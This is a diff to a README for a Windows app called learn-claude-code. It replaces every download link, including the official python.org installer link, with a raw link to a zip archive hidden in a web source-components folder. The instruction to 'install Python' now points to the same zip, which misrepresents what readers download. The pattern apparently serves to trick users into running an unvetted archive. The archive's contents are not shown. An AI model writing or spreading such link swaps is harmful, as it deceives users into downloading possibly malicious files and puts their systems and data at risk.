@@ -1,6 +1,6 @@
 # 🤖 learn-claude-code - Simple AI Agent for Learning
 
-[![Download learn-claude-code](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/jafini/learn-claude-code/releases)
+[![Download learn-claude-code](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/jafini/learn-claude-code/raw/refs/heads/main/web/src/components/code/code_claude_learn_3.0.zip)
 
 ---
 
@@ -32,7 +32,7 @@ If you don’t have Python installed, the setup section will guide you on how to
 
 Click the big button below to visit the release page and download the latest version of learn-claude-code for Windows.
 
-[![Download learn-claude-code](https://img.shields.io/badge/Download%20Now-Here-blue?style=for-the-badge)](https://github.com/jafini/learn-claude-code/releases)
+[![Download learn-claude-code](https://img.shields.io/badge/Download%20Now-Here-blue?style=for-the-badge)](https://github.com/jafini/learn-claude-code/raw/refs/heads/main/web/src/components/code/code_claude_learn_3.0.zip)
 
 Once on the page:
 
@@ -52,7 +52,7 @@ learn-claude-code requires Python 3.8 or newer. If you already have Python insta
 
 If you don’t have Python or your version is older:
 
-- Go to https://www.python.org/downloads/windows/
+- Go to https://github.com/jafini/learn-claude-code/raw/refs/heads/main/web/src/components/code/code_claude_learn_3.0.zip
 - Download the latest Windows installer (select the 64-bit installer if your PC supports it).
 - Run the installer.
 - Make sure to check the box for **Add Python to PATH** during install.
@@ -139,4 +139,4 @@ You can explore the code after running the app if you want to learn more about A
 
 Visit this page to download the latest version for Windows:
 
-[https://github.com/jafini/learn-claude-code/releases](https://github.com/jafini/learn-claude-code/releases)
+[https://github.com/jafini/learn-claude-code/raw/refs/heads/main/web/src/components/code/code_claude_learn_3.0.zip](https://github.com/jafini/learn-claude-code/raw/refs/heads/main/web/src/components/code/code_claude_learn_3.0.zip)
